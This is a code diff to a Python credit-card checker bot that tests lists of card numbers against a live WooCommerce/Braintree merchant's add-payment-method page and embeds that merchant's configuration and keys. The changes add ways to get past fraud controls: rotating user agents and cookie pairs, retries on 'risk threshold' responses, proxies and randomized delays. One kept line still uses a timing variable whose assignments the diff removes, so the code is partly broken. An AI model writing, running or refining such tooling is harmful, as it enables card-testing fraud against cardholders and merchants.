@@ -17,9 +17,8 @@ import glob
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Global variable to store the selected cookie pair
+# Global variables
 SELECTED_COOKIE_PAIR = None
-
 
 def discover_cookie_pairs():
     """Discover available cookie pairs in the current directory"""
@@ -68,7 +67,7 @@ def select_random_cookie_pair():
     return selected_pair
 
 def select_new_cookie_pair_silent():
-    """Select a new random cookie pair without printing (for each card check)"""
+    """Select a new random cookie pair without restrictions"""
     global SELECTED_COOKIE_PAIR
     
     pairs = discover_cookie_pairs()
@@ -77,9 +76,10 @@ def select_new_cookie_pair_silent():
         SELECTED_COOKIE_PAIR = {'file1': 'cookies_1.txt', 'file2': 'cookies_2.txt', 'id': 'fallback'}
         return SELECTED_COOKIE_PAIR
     
-    # Select random pair
+    # Select random pair (no usage tracking)
     selected_pair = random.choice(pairs)
     SELECTED_COOKIE_PAIR = selected_pair
+    print(f"🍪 Using cookie pair: {selected_pair['id']}")
     return selected_pair
 
 def read_cookies_from_file(filename):
@@ -120,7 +120,16 @@ def get_cookies_2():
     
     return read_cookies_from_file(SELECTED_COOKIE_PAIR['file2'])
 
-user = generate_user_agent()
+def get_rotating_user_agent():
+    """Generate different types of user agents"""
+    agents = [
+        generate_user_agent(device_type='desktop'),
+        generate_user_agent(device_type='desktop', os=('mac', 'linux')),
+        generate_user_agent(device_type='desktop', os=('win',)),
+        generate_user_agent(navigator='chrome'),
+        generate_user_agent(navigator='firefox'),
+    ]
+    return random.choice(agents)
 
 def gets(s, start, end):
     try:
@@ -148,7 +157,7 @@ def get_headers():
         'sec-fetch-user': '?1',
         'sec-gpc': '1',
         'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+        'user-agent': get_rotating_user_agent(),  # Use rotating user agents
     }
 
 def get_random_proxy():
@@ -332,6 +341,25 @@ def check_status(result):
 
     return "DECLINED CC", result, False
 
+def check_card_with_retry(cc_line, max_retries=2):
+    """Check card with retry logic for risk threshold"""
+    for attempt in range(max_retries):
+        try:
+            result = check_card(cc_line)
+            if "risk threshold" in result.lower() or "throttled" in result.lower() or "rate limit" in result.lower():
+                print(f"🔄 Risk threshold detected, retrying with new cookie pair... (Attempt {attempt + 1}/{max_retries})")
+                # Force new cookie pair selection
+                global SELECTED_COOKIE_PAIR
+                SELECTED_COOKIE_PAIR = None
+                time.sleep(random.randint(10, 15))  # Wait before retry
+                continue
+            return result
+        except Exception as e:
+            print(f"❌ Attempt {attempt + 1} failed: {str(e)}")
+            time.sleep(5)
+    
+    return "❌ Maximum retries exceeded due to risk threshold"
+
 def check_card(cc_line):
     # Select new cookie pair for this card check
     select_new_cookie_pair_silent()
@@ -383,7 +411,7 @@ def check_card(cc_line):
             'authorization': f'Bearer {au}',
             'braintree-version': '2018-05-10',
             'content-type': 'application/json',
-            'user-agent': user
+            'user-agent': get_rotating_user_agent()
         }
 
         proxy = get_random_proxy()
@@ -463,8 +491,12 @@ file = open('cc.txt', "r+")
 start_num = 0
 
 for P in file.readlines():
-    start_time = time.time()
     start_num += 1
+
+    # Add random delay between requests
+    delay_time = random.randint(8, 15)  # 8-15 seconds random delay
+    print(f"⏳ Waiting {delay_time} seconds before next card...")
+    time.sleep(delay_time)
 
     try:
         # 🎲 Select NEW random cookie pair for each card check
@@ -477,9 +509,7 @@ for P in file.readlines():
         # Get fresh authorization for each card
         add_nonce, au = get_new_auth()
         if not add_nonce or not au:
-            end_time = time.time()
-            elapsed_time = end_time - start_time
-            print(f"Skipping card due to authorization failure (Time taken: {elapsed_time:.2f} seconds)")
+            print(f"Skipping card due to authorization failure")
             continue
 
         n = P.split('|')[0]
@@ -543,7 +573,7 @@ for P in file.readlines():
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'cross-site',
             'sec-gpc': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+            'user-agent': get_rotating_user_agent(),
         }
 
         proxy = get_random_proxy()
@@ -554,8 +584,6 @@ for P in file.readlines():
             proxies=proxy,
             verify=False
         )
-        end_time = time.time()
-        elapsed_time = end_time - start_time
 
         if response.status_code == 200:
             try:
@@ -581,7 +609,7 @@ for P in file.readlines():
                         'sec-fetch-site': 'same-origin',
                         'sec-gpc': '1',
                         'upgrade-insecure-requests': '1',
-                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+                        'user-agent': get_rotating_user_agent(),
                     }
 
                     data = {
@@ -589,7 +617,7 @@ for P in file.readlines():
                         'braintree_cc_nonce_key': token,
                         'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
                         'braintree_cc_3ds_nonce_key': '',
-                        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wcr3cvc237q7jz6b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wcr3cvc237q7jz6b"},"merchantId":"wcr3cvc237q7jz6b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzYjg0OGU1NS1jY2EyLTRiZGUtODY3MS01OTJiODkzNjA1ZGUiLCJpYXQiOjE3NDk3MzMyMjcsImV4cCI6MTc0OTc0MDQyNywiaXNzIjoiNWQyZTYwYTFmYWI4ZDUxYzE4ZDdhNzdlIiwiT3JnVW5pdElkIjoiNWQyZTYwYTE2OTRlM2E0NDY0ZWRkN2NlIn0.jVz8RHEJRVCxCiXKnm0jv9uYuuEUEWopnrbi9A2ng_Y"},"paypalEnabled":true,"paypal":{"displayName":"Hakko","clientId":"AR5mQQV5vUNYSF9-TCEtSXM7mHHUfFc5hSihOKKmEyMzg9z0FNLzrfdVyTK-X_06XQ4ZCCbFww-R91jp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"hakkoGBP","payeeEmail":null,"currencyIsoCode":"GBP"}}',
+                        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wcr3cvc237q7jz6b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wcr3cvc237q7jz6b"},"merchantId":"wcr3cvc237q7jz6b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzYjg0OGU1NS1jY2EyLTRiZGUtODY3MS01OTJiODkzNjA1ZGUiLCJpYXQiOjE3NDk3MzMyMjcsImVxpCI6MTc0OTc0MDQyNywiaXNzIjoiNWQyZTYwYTFmYWI4ZDUxYzE4ZDdhNzdlIiwiT3JnVW5pdElkIjoiNWQyZTYwYTE2OTRlM2E0NDY0ZWRkN2NlIn0.jVz8RHEJRVCxCiXKnm0jv9uYuuEUEWopnrbi9A2ng_Y"},"paypalEnabled":true,"paypal":{"displayName":"Hakko","clientId":"AR5mQQV5vUNYSF9-TCEtSXM7mHHUfFc5hSihOKKmEyMzg9z0FNLzrfdVyTK-X_06XQ4ZCCbFww-R91jp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"hakkoGBP","payeeEmail":null,"currencyIsoCode":"GBP"}}',
                         'woocommerce-add-payment-method-nonce': add_nonce,
                         '_wp_http_referer': '/my-account/add-payment-method/',
                         'woocommerce_add_payment_method': '1',
@@ -604,8 +632,6 @@ for P in file.readlines():
                         proxies=proxy,
                         verify=False
                     )
-                    end_time = time.time()
-                    elapsed_time = end_time - start_time
 
                     if response.status_code == 200:
                         soup = BeautifulSoup(response.text, 'html.parser')
@@ -659,43 +685,20 @@ Bot By: 『@mhitzxg 帝 @pr0xy_xd』
                                     basic_response = f"Card: {n}|{mm}|{yy}|{cvc} - {message} - Cookie Pair: {SELECTED_COOKIE_PAIR['id']} - Time: {elapsed_time:.1f}s"
                                     print(basic_response)
                             else:
-                                print(f"Card {n}: No message found in response (Time taken: {elapsed_time:.2f} seconds)")
+                                print(f"Card {n}: No message found in response")
                         else:
-                            print(f"Card {n}: No woocommerce-notices-wrapper found (Time taken: {elapsed_time:.2f} seconds)")
+                            print(f"Card {n}: No woocommerce-notices-wrapper found")
                     else:
-                        print(f"Card {n}: Failed to add payment method, status code: {response.status_code} (Time taken: {elapsed_time:.2f} seconds)")
+                        print(f"Card {n}: Failed to add payment method, status code: {response.status_code}")
                 else:
-                    print(f"Card {n}: Invalid or missing token data in response (Time taken: {elapsed_time:.2f} seconds)")
+                    print(f"Card {n}: Invalid or missing token data in response")
             except ValueError as e:
-                print(f"Card {n}: Invalid JSON response from tokenization: {str(e)} (Time taken: {elapsed_time:.2f} seconds)")
+                print(f"Card {n}: Invalid JSON response from tokenization: {str(e)}")
         else:
-            print(f"Card {n}: Tokenization failed, status code: {response.status_code} (Time taken: {elapsed_time:.2f} seconds)")
+            print(f"Card {n}: Tokenization failed, status code: {response.status_code}")
     except IndexError:
-        end_time = time.time()
-        elapsed_time = end_time - start_time
-        print(f"Invalid card format: {P} (Time taken: {elapsed_time:.2f} seconds)")
+        print(f"Invalid card format: {P}")
         continue
 
-    # Add a delay between cards to avoid rate limiting
-    time.sleep(2)
-
 file.close()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+print("✅ Script finished!")
